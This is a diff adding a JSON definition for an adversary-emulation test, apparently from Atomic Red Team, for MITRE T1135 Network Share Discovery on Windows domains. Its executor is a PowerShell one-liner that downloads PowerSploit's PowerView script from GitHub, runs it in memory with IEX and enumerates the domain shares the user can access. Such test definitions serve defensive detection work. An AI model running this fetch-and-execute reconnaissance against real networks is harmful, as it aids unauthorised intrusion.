@@ -1,0 +1,30 @@
+{
+    "name": "Share Discovery with PowerView",
+    "description": "Enumerate Domain Shares the current user has access. Upon execution, progress info about each share being scanned will be displayed. ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "dependency_executor_name": "powershell",
+    "executor": {
+        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose\n",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1135",
+    "tactics": [
+        "Discovery"
+    ],
+    "technique": "Network Share Discovery",
+    "source": "ART",
+    "uuid": "b1636f0a-ba82-435c-b699-0d78794d8bfd",
+    "arguments": null,
+    "preconditions": [
+        {
+            "description": "Endpoint must be joined to domain\n",
+            "prereq_command": "if ((Get-WmiObject -Class Win32_ComputerSystem).PartofDomain) {exit 0} else {exit 1}\n",
+            "get_prereq_command": "\"Join system to domain\"\n"
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
